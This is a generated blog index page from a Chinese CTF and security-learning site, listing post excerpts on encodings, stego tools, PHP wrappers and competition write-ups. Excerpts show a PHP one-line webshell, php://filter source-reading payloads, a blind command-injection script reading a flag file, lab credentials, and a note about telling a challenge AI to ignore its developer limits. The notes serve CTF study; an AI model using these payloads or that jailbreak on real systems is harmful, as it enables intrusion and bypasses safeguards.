@@ -1,0 +1,225 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XUAN Blog - 网络安全学习记录</title><meta name="author" content="xuan23"><meta name="copyright" content="xuan23"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一路走来踩过不少坑，也在钻研技术的过程中收获良多。我把这里当作学习阵地，既用来梳理笔记、复盘实战，也希望分享所学，结识志同道合的朋友。未来会继续深耕方向，持续更新内容，期待和大家一起交流进步。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="XUAN Blog">
+<meta property="og:url" content="https://xuan-1117.github.io/page/4/index.html">
+<meta property="og:site_name" content="XUAN Blog">
+<meta property="og:description" content="一路走来踩过不少坑，也在钻研技术的过程中收获良多。我把这里当作学习阵地，既用来梳理笔记、复盘实战，也希望分享所学，结识志同道合的朋友。未来会继续深耕方向，持续更新内容，期待和大家一起交流进步。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xuan-1117.github.io/img/avatar.jpg">
+<meta property="article:author" content="xuan23">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xuan-1117.github.io/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xuan-1117.github.io/page/4/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XUAN Blog',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'home'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/backgrounds/bg-06.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(/img/backgrounds/bg-02.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">XUAN Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="site-info"><h1 id="site-title">XUAN Blog</h1><div id="site-subtitle"><span id="subtitle"></span></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts nc" id="recent-posts"><div class="recent-post-items"><div class="recent-post-item"><div class="post_cover left"><a href="/2025/12/11/%E5%AF%86%E7%A0%81/6%E4%BD%8D%E4%B8%80%E7%BB%84/" title="6位一组"><img class="post-bg" src="/img/backgrounds/bg-21.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="6位一组"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/11/%E5%AF%86%E7%A0%81/6%E4%BD%8D%E4%B8%80%E7%BB%84/" title="6位一组">6位一组</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-11T07:30:01.000Z" title="发表于 2025-12-11 15:30:01">2025-12-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%AF%86%E7%A0%81/">密码</a></span></div><div class="content">1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859def bytes_to_6bit_groups(data_bytes):    &quot;&quot;&quot;    将字节串按6位一组进行分组（Base64编码的核心步骤）        Args:        data_bytes: 字节串（bytes）        Returns:        6位整数列表（0-63）    &quot;&quot;&quot;    result = []    buffer = 0    bits_in_buffer = 0        for byte in data_bytes:        buffer = (buffer &lt;&lt; 8) | byte        bits_in_buffer += 8                while bits_in_buffer &gt;= 6...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/12/11/MISC/%E7%BC%96%E7%A0%81/" title="编码"><img class="post-bg" src="/img/backgrounds/bg-08.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="编码"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/11/MISC/%E7%BC%96%E7%A0%81/" title="编码">编码</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-11T07:27:04.000Z" title="发表于 2025-12-11 15:27:04">2025-12-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/MISC/">MISC</a></span></div><div class="content">PDF417  Npiet 测试链接：https://www.bertnase.de/npiet/npiet-execute.php 特点文档是像素点的图片 Quoted-printable可打印字符引用编码”、“使用可打印字符的编码”，我们收邮件，查看信件原始信息，经常会看到这种类型的编码。 比如&#x3D;3Cmeta&#x3D;20name&#x3D;3D&#x3D;22description&#x3D;22&#x3D;20flag&#x3D;3D&#x3D;22tidesec&#x3D;22&#x3D;20&#x3D;2F&#x3D;3E&#x3D;0A 在线网站：http://web.chacuo.net/charsetquotedprintable UUENCODEuuencode是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件。 比如 6OMFX]L#]U],*9FQA9WMT:61E&lt;V5C?0&#96;&#96; 在线网站：http://web.chacu...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2025/12/11/MISC/%E5%B7%A5%E5%85%B7/" title="工具"><img class="post-bg" src="/img/backgrounds/bg-06.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="工具"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/11/MISC/%E5%B7%A5%E5%85%B7/" title="工具">工具</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-11T07:26:59.000Z" title="发表于 2025-12-11 15:26:59">2025-12-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/MISC/">MISC</a></span></div><div class="content">snowSNOW.EXE  -C  -p “Th1si4st8eK3y” E:\misc\stego\snow\white.txt binwalkdd if&#x3D;WebRepo.webp of&#x3D;output.7z bs&#x3D;1 skip&#x3D;16012  dtmf2num波音号dtmf2num.exe  通过频谱图对照波音号  USB一把梭python run_GUI.py 明文攻击123456exe固定格式：0E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000echo -n &quot;0E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000&quot;...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/12/11/MISC/misc/" title="misc"><img class="post-bg" src="/img/backgrounds/bg-05.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="misc"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/11/MISC/misc/" title="misc">misc</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-11T07:26:54.000Z" title="发表于 2025-12-11 15:26:54">2025-12-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/MISC/">MISC</a></span></div><div class="content">dddvdvb文件类别识别  File命令  当文件后缀名无法准确显示而使文件无法打开时，在linux使用file+文件名可以识别出文件的后缀，修改正确后可打开  查看文件头  使用010可查看文件头类型，文件的16进制内容，头尾可能隐含flag   使用stegsolve  File Format:文件格式 Data Extract:数据提取 Steregram Solve:立体试图 左右控制偏移 Frame Browser:帧浏览器 Image Combiner:拼图 图片拼接  分离图片  有时候图片会包含其他的文件  先使用binwalk查看图片 binwalk -e pcat.bin &#x2F;&#x2F;要分解的文件名 也可使用foremost分离文件，文件会放在output文件夹里  图片内容不显示完全，高度或宽度被修改  使用以下工具  12python3 -m pip install -r requirements.txtpython3 main.py -i dabai.png   去010修改文件高度和宽度  恢复删除文件  1extundelete dis...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2025/12/11/WEB/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%A4%A7%E5%85%A8/" title="一句话木马大全"><img class="post-bg" src="/img/backgrounds/bg-17.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一句话木马大全"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/11/WEB/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%A4%A7%E5%85%A8/" title="一句话木马大全">一句话木马大全</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-11T07:20:20.000Z" title="发表于 2025-12-11 15:20:20">2025-12-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/WEB/">WEB</a></span></div><div class="content">一句话木马大全        @eval($_POST['cmd']);phpinfo();  </div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/12/11/WEB/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="伪协议"><img class="post-bg" src="/img/backgrounds/bg-18.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="伪协议"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/11/WEB/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="伪协议">伪协议</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-11T06:57:10.000Z" title="发表于 2025-12-11 14:57:10">2025-12-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/WEB/">WEB</a></span></div><div class="content">1 php:&#x2F;&#x2F;filter  #查指定文件源码 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php 替换编码方式绕过 php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf8.utf16&#x2F;resource&#x3D;index.php php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;file string.toupper string.tolower string.strip_tags php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;index.php 2 data:&#x2F;&#x2F...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2025/12/11/WEB/web%E8%84%9A%E6%9C%AC/" title="web脚本"><img class="post-bg" src="/img/backgrounds/bg-16.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web脚本"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/11/WEB/web%E8%84%9A%E6%9C%AC/" title="web脚本">web脚本</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-11T06:57:08.000Z" title="发表于 2025-12-11 14:57:08">2025-12-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/WEB/">WEB</a></span></div><div class="content">WEB无参rce使用sleep(2)进行测试 1234567891011121314151617import requestsimport timeobtain = &#x27;abcdefghijklmnopqrstuvwxyz1234567890&#123;&#125;-_,.&#x27;result=&quot;&quot;for i in range(1,100):    for n in obtain:        payload = f&quot;sleep $(cat /f* | cut -c &#123;i&#125; | tr &#123;n&#125; 2.5)&quot;        url=&quot;http://47.105.113.86:40005/&quot;        data=&#123;&quot;cmd&quot;:payload&#125;        start = int(time.time())        res=requests.post(url=url,data=data)        end = int(tim...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/12/10/%E6%AF%94%E8%B5%9Bwp/porloo%E4%B8%BB%E7%BA%BFwp-1/" title="porloo主线wp-1"><img class="post-bg" src="/img/backgrounds/bg-19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="porloo主线wp-1"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/10/%E6%AF%94%E8%B5%9Bwp/porloo%E4%B8%BB%E7%BA%BFwp-1/" title="porloo主线wp-1">porloo主线wp-1</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-10T01:16:46.000Z" title="发表于 2025-12-10 09:16:46">2025-12-10</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%AF%94%E8%B5%9Bwp/">比赛wp</a></span></div><div class="content">应急响应2-1 http://192.168.20.100 admin Skills@2020 登录jumpserver堡垒机：标签列表中可以看到flag  palu{2025_qiandao_flag} 应急响应 2-2  ubuntu&#x2F;Skills@waf https://192.168.20.102:9443/ admin&#x2F;VF6NXMs7 点击waf的身份认证功能模块中的配置按钮  可以看到flag  palu{2025_waf} 应急响应2-3 ubuntu&#x2F;Skills@mysql http://192.168.20.101:20221/4a883f0c56 64a44f8137&#x2F;f8941f8eb7 root&#x2F;mysql_QPiS8y  连接上数据库就可以看到flag palu{Mysql_@2025} 应急响应2-4 有waf，我们可以在waf中看攻击防护：  palu{192.168.20.107} 应急响应2-5 还是刚刚的waf就能看到：  2025-05-05-00:04:40 比较坑的一个地方就是题目给的...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2025/12/10/%E6%AF%94%E8%B5%9Bwp/ISCC2025/" title="ISCC2025"><img class="post-bg" src="/img/backgrounds/bg-16.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ISCC2025"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/10/%E6%AF%94%E8%B5%9Bwp/ISCC2025/" title="ISCC2025">ISCC2025</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-10T01:10:54.000Z" title="发表于 2025-12-10 09:10:54">2025-12-10</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%AF%94%E8%B5%9Bwp/">比赛wp</a></span></div><div class="content">WEBShallowSeek输入flag，显示可以输入f1@g.txt  使用联网搜索，不能直接访问  让ai忽略开发者限制，得到后半段flag  点击舍友带饭问题,发现查看源码三个路由，依次访问,访问mark_frag_ok.php时返回cookid    plain PHPSESSID=00000758a8a6cba90423adc9038677bb     访问&#x2F;api&#x2F;mark_frag_ok.php，根据提示猜测是ajax请求  构造请求包，使用cookid和ajax请求访问api&#x2F;get_frag.php，得到flag前半段  回归基本功跟据描述，发现佛耶戈很可疑，直接发送拼音  显示不在这里  往下看，有个用户代理，猜测是修改ua头  改为GaojiGongChengShiFoYeGe发送请求  访问页面  if(intval($b) &#x3D;&#x3D; ‘jibengong’)进行比较时，右边是字符串会转化为0，所以b传的值是0，用+0可以绕过正则 parse_str 存在函数变量覆盖缺陷，在注册变量之前不会验证当前变量是否存在...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/12/10/%E6%AF%94%E8%B5%9Bwp/%E5%BE%A1%E7%BD%91%E6%9D%AF2025/" title="御网杯2025"><img class="post-bg" src="/img/backgrounds/bg-22.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="御网杯2025"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/12/10/%E6%AF%94%E8%B5%9Bwp/%E5%BE%A1%E7%BD%91%E6%9D%AF2025/" title="御网杯2025">御网杯2025</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-10T00:55:27.000Z" title="发表于 2025-12-10 08:55:27">2025-12-10</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%AF%94%E8%B5%9Bwp/">比赛wp</a></span></div><div class="content">webYWB_Web_xff查看源码，只允许ip为2.2.2.1，构造来源为2.2.2.1，X-Forwarded-For:2.2.2.1     YWB_Web_命令执行过滤绕过system被过滤，使用die绕过   YWB_Web_未授权访问查看cookie,base64解码后发现角色是guest,isadmin&#x3D;0,修改为admin，isadmin&#x3D;1，url编码后发送请求    YWB_Web_反序列化查看源码    misc套娃 文件名改为doc  显示隐藏的文字  ez_xor打开后是16进制字符串，跟题目，进行xor,单字节异或爆破key,结果是f,这里ai直接算出来了   光隙中的寄生密钥foremost提取zip   需要密码，用archpr尝试爆破   随波逐流梭哈   ez_picture   把图片放pixeljihad网站提取出来九个九，猜测是密码 解压之后得到jpg,拖入随波逐流   密码gift  下面的结果加起来是Π  这个结果为pie凯撒加密6位，flag{vok}  密码一．题目截图  baby_rsa 二．解题思路（要求解...</div></div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/3/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/#content-inner">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/#content-inner">5</a><a class="extend next" rel="next" href="/page/5/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xuan23</div><div class="author-info-description">一路走来踩过不少坑，也在钻研技术的过程中收获良多。我把这里当作学习阵地，既用来梳理笔记、复盘实战，也希望分享所学，结识志同道合的朋友。未来会继续深耕方向，持续更新内容，期待和大家一起交流进步。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的技术博客。<br>记录CTF、漏洞分析、工控安全与逆向工程学习过程。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/03/22/WEB/php/" title="php"><img src="/img/backgrounds/bg-12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php"/></a><div class="content"><a class="title" href="/2026/03/22/WEB/php/" title="php">php</a><time datetime="2026-03-22T03:14:48.000Z" title="发表于 2026-03-22 11:14:48">2026-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/22/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="应急响应"><img src="/img/backgrounds/bg-20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应"/></a><div class="content"><a class="title" href="/2026/03/22/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="应急响应">应急响应</a><time datetime="2026-03-22T00:39:45.000Z" title="发表于 2026-03-22 08:39:45">2026-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/22/WEB/%E4%BF%AE%E5%A4%8D/" title="修复"><img src="/img/backgrounds/bg-19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="修复"/></a><div class="content"><a class="title" href="/2026/03/22/WEB/%E4%BF%AE%E5%A4%8D/" title="修复">修复</a><time datetime="2026-03-22T00:38:10.000Z" title="发表于 2026-03-22 08:38:10">2026-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/21/%E5%BA%94%E6%80%A5%E6%80%BB%E7%BB%93/%E4%BF%AE%E5%A4%8D/" title="修复"><img src="/img/backgrounds/bg-10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="修复"/></a><div class="content"><a class="title" href="/2026/03/21/%E5%BA%94%E6%80%A5%E6%80%BB%E7%BB%93/%E4%BF%AE%E5%A4%8D/" title="修复">修复</a><time datetime="2026-03-21T15:00:08.000Z" title="发表于 2026-03-21 23:00:08">2026-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/21/awd/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEWriteUP/" title="第二届广东大学生网络安全攻防大赛决赛Web题目WriteUP"><img src="/img/backgrounds/bg-04.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第二届广东大学生网络安全攻防大赛决赛Web题目WriteUP"/></a><div class="content"><a class="title" href="/2026/03/21/awd/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEWriteUP/" title="第二届广东大学生网络安全攻防大赛决赛Web题目WriteUP">第二届广东大学生网络安全攻防大赛决赛Web题目WriteUP</a><time datetime="2026-03-21T14:58:25.000Z" title="发表于 2026-03-21 22:58:25">2026-03-21</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/MISC/"><span class="card-category-list-name">MISC</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/WEB/"><span class="card-category-list-name">WEB</span><span class="card-category-list-count">12</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/awd/"><span class="card-category-list-name">awd</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%AF%86%E7%A0%81/"><span class="card-category-list-name">密码</span><span class="card-category-list-count">12</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E6%80%BB%E7%BB%93/"><span class="card-category-list-name">应急总结</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%AF%94%E8%B5%9Bwp/"><span class="card-category-list-name">比赛wp</span><span class="card-category-list-count">9</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E9%80%86%E5%90%91/"><span class="card-category-list-name">逆向</span><span class="card-category-list-count">1</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/awd/" style="font-size: 1.23em; color: #999ea6">awd</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 1.5em; color: #99a9bf">密码</a> <a href="/tags/WEB/" style="font-size: 1.5em; color: #99a9bf">WEB</a> <a href="/tags/MISC/" style="font-size: 1.23em; color: #999ea6">MISC</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 1.1em; color: #999">逆向</a> <a href="/tags/%E5%BA%94%E6%80%A5%E6%80%BB%E7%BB%93/" style="font-size: 1.23em; color: #999ea6">应急总结</a> <a href="/tags/%E6%AF%94%E8%B5%9Bwp/" style="font-size: 1.37em; color: #99a4b2">比赛wp</a> <a href="/tags/rsa/" style="font-size: 1.37em; color: #99a4b2">rsa</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">15</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">31</span>
+          </a>
+        </li>
+      
